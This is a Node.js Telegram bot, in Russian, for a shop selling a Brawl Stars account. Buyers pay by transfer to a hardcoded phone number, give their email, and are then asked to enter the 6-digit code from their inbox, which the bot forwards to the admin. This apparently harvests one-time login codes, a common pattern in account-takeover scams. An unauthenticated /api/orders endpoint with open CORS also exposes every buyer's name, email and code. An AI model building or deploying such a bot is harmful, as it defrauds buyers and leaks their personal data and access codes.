require('dotenv').config();
const { Telegraf, session, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const orders = new Map();
const pendingEmailByChatId = new Map();
const pendingMainMsgStore = new Map();

function generateOrderId() {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
}

const ACCOUNTS = [
  {
    id: 'acc-29444',
    title: 'Brawl Stars — 29 444 кубка',
    trophies: 29444,
    fighters: 65,
    price: 800,
    year: 2024,
    imageUrl: 'https://i.ibb.co/qYT3zH2F/photo-2026-06-20-23-05-47.jpg',
  },
];

function getAccountById(id) {
  return ACCOUNTS.find(a => a.id === id) || null;
}

function formatPrice(price) {
  return new Intl.NumberFormat('ru-RU').format(price) + ' ₽';
}

function escapeMarkdown(text) {
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

function formatDate(iso) {
  const d = new Date(iso);
  return d.toLocaleString('ru-RU', { timeZone: 'Europe/Moscow', hour12: false });
}

function statusLabel(status) {
  const map = {
    pending: '🟡 Ожидает',
    confirmed: '🔵 Подтверждён',
    code_received: '🟣 Код получен',
    fulfilled: '🟢 Завершён',
    rejected: '🔴 Отклонён',
    cancelled: '⚫ Отменён',
  };
  return map[status] || status;
}

// =====================
// ПЕРЕХОД НА ЭКРАН
// =====================
async function goTo(chatId, session, screen) {
  if (session.mainMsgId) {
    try { await bot.telegram.deleteMessage(chatId, session.mainMsgId); } catch (e) {}
    session.mainMsgId = null;
  }

  let sent;
  if (screen.type === 'photo') {
    sent = await bot.telegram.sendPhoto(chatId, screen.imageUrl, {
      caption: screen.caption,
      parse_mode: 'MarkdownV2',
      reply_markup: screen.keyboard.reply_markup,
    });
  } else {
    sent = await bot.telegram.sendMessage(chatId, screen.text, {
      parse_mode: 'MarkdownV2',
      reply_markup: screen.keyboard.reply_markup,
    });
  }
  session.mainMsgId = sent.message_id;
}

async function tempMsg(chatId, text, delay = 4000) {
  try {
    const sent = await bot.telegram.sendMessage(chatId, text);
    setTimeout(() => bot.telegram.deleteMessage(chatId, sent.message_id).catch(() => {}), delay);
  } catch (e) {}
}

// =====================
// УВЕДОМЛЕНИЯ АДМИНУ
// =====================
async function notifyAdmin(text, keyboard) {
  if (!ADMIN_CHAT_ID) return;
  try {
    await bot.telegram.sendMessage(ADMIN_CHAT_ID, text, {
      parse_mode: 'MarkdownV2',
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined,
    });
  } catch (e) { console.warn('Admin notify error:', e.message); }
}

function buildAdminOrderNotification(order, extraText = '') {
  const lines = [
    `👤 Имя: *${escapeMarkdown(order.buyerName)}*`,
    `🎮 ${escapeMarkdown(order.accountTitle)}`,
    `💰 ${escapeMarkdown(formatPrice(order.price))}`,
    `🕐 ${escapeMarkdown(formatDate(order.createdAt))}`,
    order.email ? `📧 ${escapeMarkdown(order.email)}` : null,
    order.code ? `🔑 Код: *${escapeMarkdown(order.code)}*` : null,
    extraText || null,
  ].filter(Boolean);
  return lines.join('\n');
}

// =====================
// ЭКРАНЫ ПОКУПАТЕЛЯ
// =====================
function screenCatalog(index) {
  const account = ACCOUNTS[index];
  const caption =
    `🏆 *${escapeMarkdown(account.title)}*\n\n` +
    `🥇 Кубки: *${account.trophies.toLocaleString('ru-RU')}*\n` +
    `⚔️ Бойцы: *${account.fighters}*\n` +
    `📅 Год: *${account.year}*\n` +
    `💰 Цена: *${escapeMarkdown(formatPrice(account.price))}*`;

  const navRow = [];
  if (index > 0) navRow.push(Markup.button.callback('◀ Пред.', `catalog_${index - 1}`));
  if (index < ACCOUNTS.length - 1) navRow.push(Markup.button.callback('След. ▶', `catalog_${index + 1}`));
  const rows = [];
  if (navRow.length > 0) rows.push(navRow);
  rows.push([Markup.button.callback(`🛒 Купить за ${formatPrice(account.price)}`, `buy_${account.id}`)]);

  return { type: 'photo', imageUrl: account.imageUrl, caption, keyboard: Markup.inlineKeyboard(rows) };
}

function screenPayment(account) {
  return {
    type: 'text',
    text:
      `💳 *Оплата заказа*\n\n` +
      `🎮 Аккаунт: *${escapeMarkdown(account.title)}*\n` +
      `💰 Сумма: *${escapeMarkdown(formatPrice(account.price))}*\n\n` +
      `📱 *Реквизиты СБП:*\n` +
      `📞 Номер: *\\+7 902 917\\-54\\-45*\n\n` +
      `Переведите сумму, затем нажмите кнопку 👇`,
    keyboard: Markup.inlineKeyboard([
      [Markup.button.callback('✅ Я оплатил', `paid_${account.id}`)],
      [Markup.button.callback('◀ Назад в каталог', 'back_catalog')],
    ]),
  };
}

function screenEnterName(account) {
  return {
    type: 'text',
    text:
      `✍️ *Введите ваше имя*\n\n` +
      `Напишите *полное имя и первую букву фамилии*\n` +
      `_Например: Александр К_\n\n` +
      `⚠️ Укажите имя точно как в банке при переводе\\.\n\n` +
      `💰 Сумма: *${escapeMarkdown(formatPrice(account.price))}*\n` +
      `📞 На номер: *\\+7 902 917\\-54\\-45*`,
    keyboard: Markup.inlineKeyboard([
      [Markup.button.callback('◀ Назад к оплате', `back_payment_${account.id}`)],
    ]),
  };
}

function screenWaiting(orderId, buyerName) {
  return {
    type: 'text',
    text:
      `⏳ *Ожидайте подтверждения*\n\n` +
      `Заказ: *\\#${escapeMarkdown(orderId)}*\n` +
      `Имя: *${escapeMarkdown(buyerName)}*\n\n` +
      `Продавец проверяет ваш перевод по имени\\.\n` +
      `Как только оплата подтвердится — бот сообщит вам\\.`,
    keyboard: Markup.inlineKeyboard([
      [Markup.button.callback('◀ Отменить заказ', `cancel_${orderId}`)],
    ]),
  };
}

function screenEnterEmail(orderId) {
  return {
    type: 'text',
    text:
      `🎉 *Оплата подтверждена\\!*\n\n` +
      `Заказ: *\\#${escapeMarkdown(orderId)}*\n\n` +
      `Напишите ваш *email* прямо сюда в чат:\n` +
      `_Например: example@mail\\.ru_`,
    keyboard: Markup.inlineKeyboard([]),
  };
}

function screenEnterCode(email) {
  return {
    type: 'text',
    text:
      `📬 *Проверьте почту\\!*\n\n` +
      `На адрес *${escapeMarkdown(email)}* пришло письмо с кодом\\.\n\n` +
      `Введите *6\\-значный код* прямо сюда в чат:`,
    keyboard: Markup.inlineKeyboard([]),
  };
}

function screenCodeWaiting() {
  return {
    type: 'text',
    text:
      `⏳ *Код принят\\!*\n\n` +
      `Продавец проверяет код и завершает передачу аккаунта\\.\n` +
      `Пожалуйста, подождите\\.\\.\\.`,
    keyboard: Markup.inlineKeyboard([]),
  };
}

function screenSuccess(accountTitle) {
  return {
    type: 'text',
    text:
      `🎉 *Поздравляем\\! Заказ завершён\\!*\n\n` +
      `🏆 Аккаунт *${escapeMarkdown(accountTitle)}* передан вам\\.\n\n` +
      `Спасибо за покупку\\!\n` +
      `По вопросам: @brawlhelpp`,
    keyboard: Markup.inlineKeyboard([
      [Markup.button.callback('🏠 Вернуться в каталог', 'back_catalog')],
    ]),
  };
}

function screenRejected(orderId) {
  return {
    type: 'text',
    text:
      `❌ *Заказ \\#${escapeMarkdown(orderId)} отклонён*\n\n` +
      `Оплата не найдена или имя не совпало\\.\n` +
      `Если уже перевели деньги — напишите: @brawlhelpp`,
    keyboard: Markup.inlineKeyboard([
      [Markup.button.callback('◀ Вернуться в каталог', 'back_catalog')],
    ]),
  };
}

// =====================
// СТАРТ
// =====================
bot.start(async (ctx) => {
  ctx.session = {};
  await ctx.reply(
    '👋 Привет! Это магазин аккаунтов Brawl Stars.\n\nВыбери действие:',
    Markup.keyboard([['📋 Каталог аккаунтов'], ['❓ Помощь']]).resize()
  );
});

// =====================
// КОМАНДЫ АДМИНА
// =====================
bot.command('orders', async (ctx) => {
  if (String(ctx.chat.id) !== String(ADMIN_CHAT_ID)) return;

  const active = Array.from(orders.values())
    .filter(o => !['fulfilled', 'rejected', 'cancelled'].includes(o.status))
    .sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt));

  const all = Array.from(orders.values())
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    .slice(0, 20);

  if (all.length === 0) {
    await ctx.reply('📭 Заказов пока нет.');
    return;
  }

  let text = `📋 *Все заказы* \\(последние ${all.length}\\)\n`;
  text += `🔴 Активных: *${active.length}*\n\n`;

  for (const o of all) {
    text += `*\\#${escapeMarkdown(o.orderId)}* — ${escapeMarkdown(statusLabel(o.status))}\n`;
    text += `👤 ${escapeMarkdown(o.buyerName)}`;
    if (o.email) text += ` • 📧 ${escapeMarkdown(o.email)}`;
    text += `\n💰 ${escapeMarkdown(formatPrice(o.price))} • 🕐 ${escapeMarkdown(formatDate(o.createdAt))}\n`;

    // Кнопки только для активных
    if (o.status === 'pending') {
      text += `_→ /confirm\\_${o.orderId} или /reject\\_${o.orderId}_\n`;
    } else if (o.status === 'code_received') {
      text += `_→ /complete\\_${o.orderId} или /reject\\_${o.orderId}_\n`;
    }
    text += '\n';
  }

  await ctx.reply(text, { parse_mode: 'MarkdownV2' });
});

bot.command('order', async (ctx) => {
  if (String(ctx.chat.id) !== String(ADMIN_CHAT_ID)) return;
  const id = ctx.message.text.split(' ')[1]?.toUpperCase();
  if (!id) return ctx.reply('Использование: /order ID');

  const order = orders.get(id);
  if (!order) return ctx.reply(`❌ Заказ #${id} не найден.`);

  const buttons = [];
  if (order.status === 'pending') {
    buttons.push([
      { text: '✅ Подтвердить', callback_data: `fulfill_${order.orderId}` },
      { text: '❌ Отклонить', callback_data: `reject_${order.orderId}` },
    ]);
  } else if (order.status === 'code_received') {
    buttons.push([
      { text: '✅ Завершить', callback_data: `complete_${order.orderId}` },
      { text: '❌ Отклонить', callback_data: `reject_${order.orderId}` },
    ]);
  }

  const text =
    `📦 *Заказ \\#${escapeMarkdown(order.orderId)}*\n\n` +
    `${escapeMarkdown(statusLabel(order.status))}\n\n` +
    buildAdminOrderNotification(order) + '\n' +
    `🕐 Создан: ${escapeMarkdown(formatDate(order.createdAt))}`;

  await ctx.reply(text, {
    parse_mode: 'MarkdownV2',
    reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined,
  });
});

// Быстрые команды /confirm_ID /reject_ID /complete_ID
bot.hears(/^\/confirm_([A-F0-9]+)$/i, async (ctx) => {
  if (String(ctx.chat.id) !== String(ADMIN_CHAT_ID)) return;
  const orderId = ctx.match[1].toUpperCase();
  const order = orders.get(orderId);
  if (!order) return ctx.reply(`❌ Заказ #${orderId} не найден.`);
  if (order.status !== 'pending') return ctx.reply('⚠️ Уже обработан.');
  await handleFulfill(ctx, orderId);
});

bot.hears(/^\/reject_([A-F0-9]+)$/i, async (ctx) => {
  if (String(ctx.chat.id) !== String(ADMIN_CHAT_ID)) return;
  const orderId = ctx.match[1].toUpperCase();
  await handleReject(ctx, orderId);
});

bot.hears(/^\/complete_([A-F0-9]+)$/i, async (ctx) => {
  if (String(ctx.chat.id) !== String(ADMIN_CHAT_ID)) return;
  const orderId = ctx.match[1].toUpperCase();
  await handleComplete(ctx, orderId);
});

// =====================
// ЛОГИКА ДЕЙСТВИЙ АДМИНА (переиспользуется в кнопках и командах)
// =====================
async function handleFulfill(ctx, orderId) {
  const order = orders.get(orderId);
  if (!order) return;
  if (order.status !== 'pending') {
    await ctx.reply(`⚠️ Заказ #${orderId} уже обработан (${statusLabel(order.status)}).`);
    return;
  }

  order.status = 'confirmed';
  orders.set(orderId, order);
  pendingEmailByChatId.set(String(order.chatId), orderId);

  await ctx.reply(
    `✅ Заказ *\\#${escapeMarkdown(orderId)}* подтверждён\\.\n` +
    `👤 ${escapeMarkdown(order.buyerName)} — ожидаю email\\.`,
    { parse_mode: 'MarkdownV2' }
  );

  const buyerChatId = Number(order.chatId);
  try {
    const sent = await bot.telegram.sendMessage(buyerChatId,
      `🎉 *Оплата подтверждена\\!*\n\n` +
      `Заказ: *\\#${escapeMarkdown(orderId)}*\n\n` +
      `Напишите ваш *email* прямо сюда в чат:\n` +
      `_Например: example@mail\\.ru_`,
      { parse_mode: 'MarkdownV2' }
    );
    pendingMainMsgStore.set(String(buyerChatId), sent.message_id);
  } catch (e) { console.warn(e.message); }
}

async function handleReject(ctx, orderId) {
  const order = orders.get(orderId);
  if (!order) {
    await ctx.reply(`❌ Заказ #${orderId} не найден.`);
    return;
  }
  if (order.status === 'fulfilled') {
    await ctx.reply('⚠️ Заказ уже завершён, нельзя отклонить.');
    return;
  }

  order.status = 'rejected';
  orders.set(orderId, order);

  await ctx.reply(
    `❌ Заказ *\\#${escapeMarkdown(orderId)}* отклонён\\.\n` +
    `👤 ${escapeMarkdown(order.buyerName)}`,
    { parse_mode: 'MarkdownV2' }
  );

  if (order.chatId) {
    try {
      const sent = await bot.telegram.sendMessage(order.chatId,
        `❌ *Заказ \\#${escapeMarkdown(orderId)} отклонён\\.*\n\n` +
        `Если уже перевели деньги — напишите: @brawlhelpp`,
        { parse_mode: 'MarkdownV2' }
      );
      pendingMainMsgStore.set(String(order.chatId), sent.message_id);
    } catch (e) { console.warn(e.message); }
  }
}

async function handleComplete(ctx, orderId) {
  const order = orders.get(orderId);
  if (!order) {
    await ctx.reply(`❌ Заказ #${orderId} не найден.`);
    return;
  }
  if (order.status !== 'code_received') {
    await ctx.reply(`⚠️ Заказ #${orderId} не в статусе "Код получен" (${statusLabel(order.status)}).`);
    return;
  }

  order.status = 'fulfilled';
  orders.set(orderId, order);

  await ctx.reply(
    `🏆 Заказ *\\#${escapeMarkdown(orderId)}* завершён\\!\n\n` +
    `👤 ${escapeMarkdown(order.buyerName)}\n` +
    `📧 ${escapeMarkdown(order.email)}\n` +
    `🔑 ${escapeMarkdown(order.code)}`,
    { parse_mode: 'MarkdownV2' }
  );

  if (order.chatId) {
    try {
      const sent = await bot.telegram.sendMessage(order.chatId,
        `🎉 *Поздравляем\\! Заказ завершён\\!*\n\n` +
        `🏆 Аккаунт *${escapeMarkdown(order.accountTitle)}* передан вам\\.\n\n` +
        `Спасибо за покупку\\! По вопросам: @brawlhelpp`,
        { parse_mode: 'MarkdownV2' }
      );
      pendingMainMsgStore.set(String(order.chatId), sent.message_id);
    } catch (e) { console.warn(e.message); }
  }
}

// =====================
// КАТАЛОГ
// =====================
bot.hears('📋 Каталог аккаунтов', async (ctx) => {
  ctx.session = ctx.session || {};
  ctx.session.step = 'catalog';
  ctx.session.catalogIndex = 0;
  await goTo(ctx.chat.id, ctx.session, screenCatalog(0));
});

bot.action(/^catalog_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1], 10);
  if (index < 0 || index >= ACCOUNTS.length) return ctx.answerCbQuery();
  ctx.session.catalogIndex = index;
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery();
  await goTo(ctx.chat.id, ctx.session, screenCatalog(index));
});

bot.action('back_catalog', async (ctx) => {
  ctx.session = ctx.session || {};
  const index = ctx.session.catalogIndex || 0;
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery();
  await goTo(ctx.chat.id, ctx.session, screenCatalog(index));
});

bot.action(/^buy_(.+)$/, async (ctx) => {
  const account = getAccountById(ctx.match[1]);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'payment';
  await ctx.answerCbQuery();
  await goTo(ctx.chat.id, ctx.session, screenPayment(account));
});

bot.action(/^back_payment_(.+)$/, async (ctx) => {
  const account = getAccountById(ctx.match[1]);
  if (!account) return ctx.answerCbQuery();
  ctx.session.step = 'payment';
  await ctx.answerCbQuery();
  await goTo(ctx.chat.id, ctx.session, screenPayment(account));
});

bot.action(/^paid_(.+)$/, async (ctx) => {
  const account = getAccountById(ctx.match[1]);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'awaiting_name';
  await ctx.answerCbQuery();
  await goTo(ctx.chat.id, ctx.session, screenEnterName(account));
});

bot.action(/^cancel_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (order && order.status === 'pending') {
    order.status = 'cancelled';
    orders.set(orderId, order);
    await notifyAdmin(
      `⚫ *Заказ \\#${escapeMarkdown(orderId)} отменён покупателем*\n\n` +
      `👤 ${escapeMarkdown(order.buyerName)}\n` +
      `💰 ${escapeMarkdown(formatPrice(order.price))}`
    );
  }
  ctx.session.step = 'catalog';
  await ctx.answerCbQuery('Заказ отменён');
  await goTo(ctx.chat.id, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
});

// =====================
// MIDDLEWARE: восстановить step + mainMsgId
// =====================
bot.use(async (ctx, next) => {
  if (ctx.message?.text) {
    ctx.session = ctx.session || {};
    const chatId = String(ctx.chat?.id);

    const pendingOrderId = pendingEmailByChatId.get(chatId);
    if (pendingOrderId && ctx.session.step !== 'awaiting_email') {
      ctx.session.step = 'awaiting_email';
      ctx.session.orderId = pendingOrderId;
      pendingEmailByChatId.delete(chatId);
    }

    const savedMsgId = pendingMainMsgStore.get(chatId);
    if (savedMsgId) {
      ctx.session.mainMsgId = savedMsgId;
      pendingMainMsgStore.delete(chatId);
    }
  }
  return next();
});

// =====================
// ОБРАБОТКА ТЕКСТА
// =====================
bot.on('text', async (ctx) => {
  ctx.session = ctx.session || {};
  const text = ctx.message.text.trim();
  const step = ctx.session.step;
  const chatId = ctx.chat.id;

  try { await ctx.deleteMessage(); } catch (e) {}

  if (text === '❓ Помощь') {
    await tempMsg(chatId,
      '📞 По вопросам: @brawlhelpp\n\n' +
      '1️⃣ Каталог → выберите аккаунт\n' +
      '2️⃣ Оплатите через СБП\n' +
      '3️⃣ Нажмите "Я оплатил"\n' +
      '4️⃣ Введите имя как в банке\n' +
      '5️⃣ Дождитесь подтверждения\n' +
      '6️⃣ Введите email\n' +
      '7️⃣ Проверьте почту, введите код\n' +
      '8️⃣ Готово! 🏆', 8000
    );
    return;
  }
  if (text === '📋 Каталог аккаунтов') return;
  // Игнорировать команды от не-админа
  if (text.startsWith('/') && String(chatId) !== String(ADMIN_CHAT_ID)) return;

  // --- Ввод имени ---
  if (step === 'awaiting_name') {
    if (text.length < 3) {
      await tempMsg(chatId, '❌ Введите полное имя и первую букву фамилии.\nНапример: Александр К');
      return;
    }
    const account = getAccountById(ctx.session.selectedAccountId);
    if (!account) {
      ctx.session.step = 'catalog';
      await goTo(chatId, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
      return;
    }

    ctx.session.buyerName = text;
    ctx.session.step = 'awaiting_admin_confirm';

    const orderId = generateOrderId();
    const order = {
      orderId, buyerName: text, email: null,
      accountId: account.id, accountTitle: account.title,
      price: account.price, status: 'pending', code: null,
      chatId: String(chatId), createdAt: new Date().toISOString(),
    };
    orders.set(orderId, order);
    ctx.session.orderId = orderId;

    await goTo(chatId, ctx.session, screenWaiting(orderId, text));

    await notifyAdmin(
      `🆕 *Новый заказ \\#${escapeMarkdown(orderId)}*\n\n` +
      buildAdminOrderNotification(order) + '\n\n' +
      `Проверьте перевод по имени и подтвердите:`,
      [[
        { text: '✅ Подтвердить оплату', callback_data: `fulfill_${orderId}` },
        { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
      ]]
    );
    return;
  }

  if (step === 'awaiting_admin_confirm') {
    await tempMsg(chatId, '⏳ Ваш заказ на проверке. Дождитесь подтверждения от продавца.');
    return;
  }

  // --- Ввод email ---
  if (step === 'awaiting_email') {
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) {
      await tempMsg(chatId, '❌ Неверный формат email.\nНапример: example@mail.ru');
      return;
    }
    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = 'catalog';
      await goTo(chatId, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
      return;
    }

    order.email = text;
    orders.set(orderId, order);
    ctx.session.step = 'awaiting_code_from_email';

    await goTo(chatId, ctx.session, screenEnterCode(text));

    await notifyAdmin(
      `📧 *Заказ \\#${escapeMarkdown(orderId)}* — email получен\n\n` +
      buildAdminOrderNotification(order) + '\n\n' +
      `Нажмите чтобы запросить код у покупателя:`,
      [[{ text: '📨 Запросить код у покупателя', callback_data: `askcode_${orderId}` }]]
    );
    return;
  }

  // --- Ввод кода ---
  if (step === 'awaiting_code_from_email') {
    if (!/^\d{6}$/.test(text)) {
      await tempMsg(chatId, '❌ Код должен состоять из 6 цифр.\nПроверьте письмо и попробуйте ещё раз.');
      return;
    }
    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = 'catalog';
      await goTo(chatId, ctx.session, screenCatalog(ctx.session.catalogIndex || 0));
      return;
    }

    order.code = text;
    order.status = 'code_received';
    orders.set(orderId, order);
    ctx.session.step = 'awaiting_final_confirm';

    await goTo(chatId, ctx.session, screenCodeWaiting());

    await notifyAdmin(
      `🔑 *Заказ \\#${escapeMarkdown(orderId)}* — код от покупателя\n\n` +
      buildAdminOrderNotification(order) + '\n\n' +
      `Проверьте код и завершите заказ:`,
      [[
        { text: '✅ Завершить заказ', callback_data: `complete_${orderId}` },
        { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
      ]]
    );
    return;
  }

  if (step === 'awaiting_final_confirm') {
    await tempMsg(chatId, '⏳ Продавец проверяет код. Совсем скоро!');
    return;
  }
});

// =====================
// КНОПКИ АДМИНА (inline)
// =====================
bot.action(/^fulfill_(.+)$/, async (ctx) => {
  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Подтверждаю...');
  await handleFulfill(ctx, ctx.match[1]);
});

bot.action(/^askcode_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);
  if (!order) return ctx.answerCbQuery('❌ Заказ не найден');

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('📨 Запрос отправлен');
  await ctx.reply(`📨 Запрос кода отправлен покупателю (заказ #${orderId})`);

  if (order.chatId) {
    try {
      const sent = await bot.telegram.sendMessage(order.chatId,
        `📬 *Проверьте почту\\!*\n\n` +
        `На адрес *${escapeMarkdown(order.email)}* пришло письмо с кодом\\.\n\n` +
        `Введите *6\\-значный код* прямо сюда в чат:`,
        { parse_mode: 'MarkdownV2' }
      );
      pendingMainMsgStore.set(String(order.chatId), sent.message_id);
    } catch (e) { console.warn(e.message); }
  }
});

bot.action(/^complete_(.+)$/, async (ctx) => {
  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Завершаю...');
  await handleComplete(ctx, ctx.match[1]);
});

bot.action(/^reject_(.+)$/, async (ctx) => {
  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('❌ Отклоняю...');
  await handleReject(ctx, ctx.match[1]);
});

// =====================
// EXPRESS + API
// =====================
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.get('/', (req, res) => res.json({ ok: true, message: 'Bot is running' }));

app.get('/api/orders', (req, res) => {
  const list = Array.from(orders.values())
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
  res.json({ orders: list });
});

app.get('/api/order/:id', (req, res) => {
  const order = orders.get(req.params.id.toUpperCase());
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json({
    orderId: order.orderId, status: order.status,
    code: order.status === 'fulfilled' ? order.code : null,
    accountTitle: order.accountTitle, price: order.price,
    createdAt: order.createdAt,
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server on port ${PORT}`));
bot.launch();
console.log('✅ Bot started');
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
